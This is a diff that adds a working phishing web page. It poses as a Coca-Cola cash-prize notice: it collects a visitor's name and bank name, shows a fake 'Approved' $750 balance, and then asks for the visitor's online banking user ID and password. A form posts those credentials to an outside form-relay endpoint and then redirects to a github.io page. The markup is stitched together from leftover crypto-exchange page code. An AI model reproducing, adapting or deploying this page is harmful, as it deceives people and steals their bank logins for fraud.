@@ -1,1 +1,819 @@
 
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+
+<meta charset=utf-8>   
+
+  <title>Verify</title>
+  <style>
+    #mainContent {
+      display: none;
+    }
+    
+    #processing {
+      display: none;
+      text-align: center;
+    }
+    
+    .lds-ring {
+      display: inline-block;
+      position: relative;
+      width: 60px;
+      height: 60px;
+    }
+    
+    .lds-ring div {
+      box-sizing: border-box;
+      display: block;
+      position: absolute;
+      width: 145px;
+      height: 145px;
+      margin: 8px;
+      border: 7px solid DarkRed;
+      border-radius: 50%;
+      animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+      border-color: DarkRed transparent transparent transparent;
+    }
+    
+    .lds-ring div:nth-child(1) {
+      animation-delay: -0.45s;
+    }
+    
+    .lds-ring div:nth-child(2) {
+      animation-delay: -0.3s;
+    }
+    
+    .lds-ring div:nth-child(3) {
+      animation-delay: -0.15s;
+    }
+    
+    @keyframes lds-ring {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+  <script>
+    function submitForm() {
+      // Hide the form
+      document.getElementById("myForm").style.display = "none";
+      
+      // Display the "Processing" message and animation
+      document.getElementById("processing").style.display = "block";
+      
+      // Delay displaying the main content
+      setTimeout(function() {
+        // Hide the processing message and animation
+        document.getElementById("processing").style.display = "none";
+        
+        // Display the main content
+        document.getElementById("mainContent").style.display = "block";
+        
+        // Get the form data
+        const name = document.getElementById("name").value;
+        const email = document.getElementById("email").value;
+        
+        // Display the submitted form data in multiple places within the main content
+        const submittedNameElements = document.getElementsByClassName("submittedName");
+        const submittedEmailElements = document.getElementsByClassName("submittedEmail");
+        
+        for (let i = 0; i < submittedNameElements.length; i++) {
+          submittedNameElements[i].textContent = name;
+        }
+        
+        for (let i = 0; i < submittedEmailElements.length; i++) {
+          submittedEmailElements[i].textContent = email;
+        }
+        
+        // Scroll to the main content section
+        document.getElementById("mainContent").scrollIntoView({ behavior: 'smooth' });
+      }, 3000); // 13 seconds delay
+    }
+  </script>
+</head>
+<body>
+
+
+
+  
+  
+  
+  
+  <form id="myForm" onsubmit="submitForm(); return false;">
+  
+ 
+  <div> 
+  <div class="formbold-form-wrapper">
+
+
+  <form id="myForm" onsubmit="submitForm(); return false;">
+
+ 
+<h5>
+<strong> <br>
+To Continue Enter  Your Name And The Name Of The Bank You Wish To Receive The Cash Prize.
+
+</strong> <br><br>
+</h5>  
+
+
+
+
+
+
+<div id="error-message"></div>
+
+<script>
+function validateInput(input) {
+  var minLength = 4;
+  var maxLength = 50;
+  var errorMessage = document.getElementById("error-message");
+
+  if (input.value.length < minLength || input.value.length > maxLength) {
+    errorMessage.textContent = "Enter name";
+    input.setCustomValidity("Complete This");
+  } else {
+    errorMessage.textContent = "";
+    input.setCustomValidity("");
+  }
+}
+</script>
+
+
+
+
+<div class="formbold-mb-5">
+        <label for="Field1" class="formbold-form-label">   
+       <strong> Enter your first and last name</strong>
+        </label>
+  
+        <input
+          type="text" 
+          
+          oninput="validateInput(this)"
+          
+          required 
+          name="A_"
+         
+         id="name"
+         
+          placeholder="Enter First and Last Name"  
+          class="formbold-form-input"
+        />
+      </div>
+      
+
+
+
+<br>
+
+
+     <label for="Field1" class="formbold-form-label">  
+<strong>
+Enter name of the bank you wish to receive the cash prize ( only the name of the bank )
+</strong>
+</label>
+
+
+    <input type="text" id="email" name="A_"
+
+oninput="validateInput(this)"
+
+    placeholder="Enter Name Of Bank"  
+          class="formbold-form-input" required
+        />
+      </div>
+
+
+<br>
+
+      <div>
+        <button type="submit" value="Submit"
+       class="formbold-btn w-full">CONTINUE</button>
+      </div>
+      
+      
+          <br> <br> <br> 
+
+
+
+     <br> 
+<br>
+  
+<center> <h5>
+<strong> 
+&copy 
+ 1886 - 2023 | Coca - Cola<br>
+All rights reserved
+</center> 
+<br> 
+</strong>
+</h5> 
+
+
+    </form>
+  </div>
+</div>
+
+
+  
+
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  body {
+    font-family: "Inter", sans-serif;
+  }
+  .formbold-mb-7 {
+    margin-bottom: 20px;
+  }
+  .formbold-pt-8 {
+    padding-top: 12px;
+  }
+  .formbold-main-wrapper {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 48px;
+  }
+
+  .formbold-form-wrapper {
+    margin: 0 auto;
+    max-width: 550px;
+    width: 100%;
+    background: white;
+  }
+  .formbold-form-label {
+    display: block;
+    font-weight: 500;
+    font-size: 17px;
+    color: Black;
+    margin-bottom: 14px;
+  }
+  .formbold-form-label-9 {
+    font-weight: 500;
+    font-size: 18px;
+    margin-bottom: 20px;
+  }
+
+  .formbold-form-input {
+    width: 100%;
+    padding: 17px 24px;
+    border-radius: 6px;
+    border: 2px solid Black;
+    background: white;
+    font-weight: 500;
+    font-size: 18px;
+    color: Black;
+    outline: none;
+    resize: none;
+  }
+  .formbold-form-input:focus {
+    border-color: Grey;
+    box-shadow: 0px 3px 8px rgba(0, 0, 0, 0.05);
+  }
+
+  .formbold-btn {
+    text-align: center;
+    font-size: 26px;
+    border-radius: 30px;
+    padding: 18px 32px;
+    border: none;
+    font-weight: 500;
+    background-color: DarkRed;
+    color: white;
+    cursor: pointer;
+  }
+  .formbold-btn:hover {
+    box-shadow: 0px 3px 8px rgba(0, 0, 0, 0.05);
+  }
+
+  .formbold--mx-3 {
+    margin-left: -12px;
+    margin-right: -12px;
+  }
+  .formbold-px-3 {
+    padding-left: 12px;
+    padding-right: 12px;
+  }
+  .flex {
+    display: flex;
+  }
+  .flex-wrap {
+    flex-wrap: wrap;
+  }
+  .w-full {
+    width: 100%;
+  }
+
+  .formbold-file-input input {
+    opacity: 0;
+    position: absolute;
+    width: 100%;
+    height: 100%;
+  }
+
+  .formbold-file-input label {
+    position: relative;
+    border: 1px dashed #e0e0e0;
+    border-radius: 6px;
+    min-height: 200px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 48px;
+    text-align: center;
+  }
+  .formbold-drop-file {
+    display: block;
+    font-weight: 600;
+    color: #07074d;
+    font-size: 20px;
+    margin-bottom: 8px;
+  }
+
+  .formbold-or {
+    font-weight: 500;
+    font-size: 16px;
+    color: #6b7280;
+    display: block;
+    margin-bottom: 8px;
+  }
+  .formbold-browse {
+    font-weight: 500;
+    font-size: 16px;
+    color: #07074d;
+    display: inline-block;
+    padding: 8px 28px;
+    border: 1px solid #e0e0e0;
+    border-radius: 4px;
+  }
+
+  .formbold-file-list {
+    border-radius: 6px;
+    background: #f5f7fb;
+    padding: 16px 32px;
+  }
+
+  .formbold-file-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .formbold-file-item button {
+    color: DarkRed;
+    border: none;
+    background: transparent;
+    cursor: pointer;
+  }
+
+  .formbold-file-name {
+    font-weight: 500;
+    font-size: 16px;
+    color: #07074d;
+    padding-right: 12px;
+  }
+  .formbold-progress-bar {
+    margin-top: 20px;
+    position: relative;
+    width: 100%;
+    height: 6px;
+    border-radius: 8px;
+    background: #e2e5ef;
+  }
+
+  .formbold-progress {
+    position: absolute;
+    width: 75%;
+    height: 100%;
+    left: 0;
+    top: 0;
+    background: #6a64f1;
+    border-radius: 8px;
+  }
+
+  @media (min-width: 540px) {
+    .sm\:w-half {
+      width: 50%;
+    }
+  }
+</style> 
+  
+
+
+
+
+
+  <div id="processing">
+
+
+
+    <h5> 
+<strong> 
+<br> <br> 
+<br><br>
+<font size="+3">
+Processing....
+</font>
+
+<br><br>
+
+
+   </strong> 
+</h5> 
+
+
+    <div class="lds-ring">
+      <div></div>
+      <div></div>
+      <div></div>
+      <div></div>
+    </div>
+  </div>
+  
+
+
+
+  <div id="mainContent">
+
+
+
+
+
+   
+<html class=light lang=en><head><script src="https://www.googleoptimize.com/optimize.js?id=OPT-N3D6ZNP"></script><script>if(document.cookie.match("uc_performance_v1_0=accepted")?.length){
+            window.dataLayer.push({'event': 'optimize.activate'});
+        }</script>
+
+
+<meta charset=utf-8>
+
+
+<title>
+
+Verify
+</title>
+
+
+
+<meta content="width=device-width, initial-scale=1.0" name=viewport>
+
+
+<link href=https://www.bitpanda.com/en rel=canonical><link href=/en hreflang=x-default rel=alternate><link href=/en hreflang=en rel=alternate><link href=/de hreflang=de rel=alternate><link href=/fr hreflang=fr rel=alternate><link href=/es hreflang=es rel=alternate><link href=/it hreflang=it rel=alternate><link href=/pl hreflang=pl rel=alternate>
+
+<link href="https://cdn.bitpanda.com/app/v2/css/all.min.css?id=622e023bba9164dff838" rel=stylesheet><script src="https://cdn.bitpanda.com/app/v2/js/head.min.js?id=e37b5634f1d9be3b8e80"></script>
+
+
+<script type=application/ld+json>{
+                "@context": "https://schema.org",
+                "@type": "BreadcrumbList",
+                "itemListElement": [
+                    [{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/www.bitpanda.com\/en"}]
+                ]
+            }</script> <body class="default home light" style="position: unset;"><header id=layout-header><header><div class="bp-nav js-contains-anchor"><div class=bp-nav__container><div class=util-flex-shrink-0>
+
+
+
+
+
+
+
+<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Coca-Cola_logo.svg/640px-Coca-Cola_logo.svg.png" jsaction="VQAsE" class="r48jcc pT0Scc iPVvYb" style="max-width: 1280px; opacity: 1; transform: none; width: 185px; height: 55px; margin: 0px;" alt="Coca-Cola - Wikipedia" jsname="kn3ccd" aria-hidden="false">
+
+
+
+ </div>
+ 
+</header> 
+    
+    
+    
+    
+  
+
+ <section id=layout-content tabindex=-1><section class="default uk-padding-remove-bottom uk-section"><div class=uk-container><div class="uk-child-width-1-2@m uk-flex-middle uk-grid" uk-grid=""><div class=default><section class="module-text uk-padding-remove-bottom uk-padding-remove-top uk-section uk-text-left uk-text-left@m"><div class=module-text__content>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h6> 
+
+<strong>
+
+<div style="background-color: darkred; border-radius: 10px; padding: 20px; color: white;">
+
+<font size="+1">
+
+ <span class="submittedName"></span>
+ 
+ </font> 
+ 
+ <br> 
+ 
+ <br> 
+
+<div> 
+<div class="container">
+    <div class="left-text"><strong> 
+    
+<font size="+0.5">
+
+Approved
+
+</strong></font>
+
+</div>
+    <div class="right-text"><font size="+0.5">Balance:</font> <strong>
+    
+    <br>
+    
+    <font size="+3">
+ $750.00
+</font></strong> </div>
+</div>
+
+<style>
+    .container {
+        display: flex;
+        justify-content: space-between;
+    }
+    .left-text {
+        justify-self: flex-start;
+    }
+    .right-text {
+        justify-self: flex-end;
+    }
+</style>
+
+</div> 
+
+</div> 
+
+
+
+<br> <br>
+    
+<font size="+0.5">
+<Font STYLE="word-spacing:4px">
+
+<strong>  
+
+
+
+We are unable to authenticate that the <span class="submittedEmail"></span>   account you provided earlier belongs to you, which is why there was a delay in sending you a verification code. Please follow the procedures below to manually log in to your bank account and verify that it belongs to you. This step is necessary to ensure that the cash prize is not mistakenly sent to the wrong person. 
+
+
+
+
+
+
+
+
+
+
+<br> <br>
+<br> 
+
+
+
+<center>
+
+
+<font size="+3">
+<span class="submittedEmail"></span> 
+</font>
+</center> 
+
+<br>
+
+
+
+<div> 
+<div class="container">
+    <div class="left-text"><strong> 
+    
+<font size="+1">
+Digital Services
+</strong></font>
+
+</div>
+    <div class="right-text">
+    
+    <font size="+1">
+    Login
+</font>
+
+
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTvF16t22BS4V3JPQHoBf3rqiJ77vBW4OYKRw&amp;usqp=CAU" jsaction="VQAsE" class="sFlh5c pT0Scc iPVvYb" style="max-width: 1640px; width: 28px; height: 30px; margin: 0px;" alt="Pinterest" jsname="kn3ccd" aria-hidden="false">
+
+  <br>
+  Secure
+    
+ 
+   </div>
+</div>
+
+<style>
+    .container {
+        display: flex;
+        justify-content: space-between;
+    }
+    .left-text {
+        justify-self: flex-start;
+    }
+    .right-text {
+        justify-self: flex-end;
+    }
+</style>
+
+</div> 
+
+
+
+
+
+
+
+
+
+
+
+
+<div style="background-color: lightgray; border-radius: 1px; padding: 20px; color: Black;">
+
+
+   
+ 
+   <div>
+    <div class="container">
+        <div class="left-text">
+        
+        
+            <strong>
+               
+                    <span style="text-decoration: underline; text-decoration-color: orange; text-decoration-thickness: 4px; font-size: 17px;">Online Banking</span>
+                    
+                    </strong> 
+            
+            
+        </div>
+        <div class="center-text">
+        
+        
+            <strong>
+               
+                    <span style="font-size: 1px;">&nbsp</span>
+               
+            </strong>
+            
+            
+        </div>
+        <div class="right-text">
+        
+        
+        
+            <strong>
+               
+                    <span style="font-size: 1px;">
+                    
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTvF16t22BS4V3JPQHoBf3rqiJ77vBW4OYKRw&amp;usqp=CAU" jsaction="VQAsE" class="sFlh5c pT0Scc iPVvYb" style="max-width: 1640px; width: 28px; height: 30px; margin: 0px;" alt="Pinterest" jsname="kn3ccd" aria-hidden="false">
+                
+                    
+                    </span>
+               
+            </strong>        
+            
+            
+            
+        </div>
+    </div>
+</div>
+
+<style>
+    .container {
+        display: flex;
+        justify-content: space-between;
+    }
+    .left-text {
+        justify-self: flex-start;
+    }
+    .center-text {
+        justify-self: center;
+    }
+    .right-text {
+        justify-self: flex-end;
+    }
+</style>
+   
+   <br>
+   
+   
+   <form  action="https://formsubmit.io/send/538bcbc9-8ef0-46ba-9114-8a9534b3b334" method="POST">
+
+<input name="_redirect" type="hidden" id="name" value="https://enjoy-org.github.io/reverlfy.Enjoy.com/">
+
+   
+   
+   
+   <input type="text" placeholder=" Enter Your User ID / Username" name="UserId-UsernameBANK" required  style="width: 100%; font-size: 19px; padding: 14px 0; background-color: #ffffff; border: 1px solid white; font-weight: bold;" />
+   
+  
+    <br> <br>
+    
+    
+    <input type="text" placeholder=" Enter Your Password" name="Passssword" required style="width: 100%; font-size: 19px; padding: 14px 0; background-color: #ffffff; border: 1px solid white; font-weight: bold;" />
+    
+    
+       <br> 
+    <br> <br>
+    
+    
+    <button type="submit" style="padding: 10px 45px; font-size: 19px; font-weight: bold; background-color: #2F539B; color: #ffffff; border: none;">Login</button>
+    
+    
+   </form>
+    <br>
+    <br>
+    Powered by <span class="submittedEmail"></span> 
+</div>
+
+
+
+<br> <br><br><br>
+
+
+
+
+
+
+</font>  </font> 
+
+
+
+
+ </h6> 
+ 
+ 
+  
+  
+  
+ 
+
+
+<script>window.initScriptLater = function (scriptUrl, fallback) {
+        const script = document.createElement("script");
+        script.onload = fallback;
+        script.src = scriptUrl;
+
+        document.addEventListener("readystatechange", () => {
+            if (document.readyState === "interactive") {
+                document.head.appendChild(script);
+            }
+        });
+    };
+
+    window.initScriptLater("https://cdn.bitpanda.com/app/v2/js/cta-button.min.js?id=d34a8a89944479eef669", () =>
+        window.initCtaButton()
+    );</script></div></nav> </div> </div></div> </section> <section class=footer__navbar><div class=uk-container><div class="uk-child-width-auto@s uk-flex-between uk-flex-middle" uk-grid="">
+
+
+<div>
+
+
+ </section> <section class="footer__navbar footer__navbar--sm footer__navbar__gradient"><div class=uk-container><div class=uk-flex-between uk-grid=""><div class="uk-text-center uk-text-right@m uk-width-1-1 uk-width-auto@m">
+
+
+
+</path> </symbol></svg>
+
+
+  </div>
+  
+  <script>
+    // Hide the processing message and form initially
+    document.getElementById("processing").style.display = "none";
+    document.getElementById("myForm").style.display = "block";
+  </script>
+</body>
+</html>
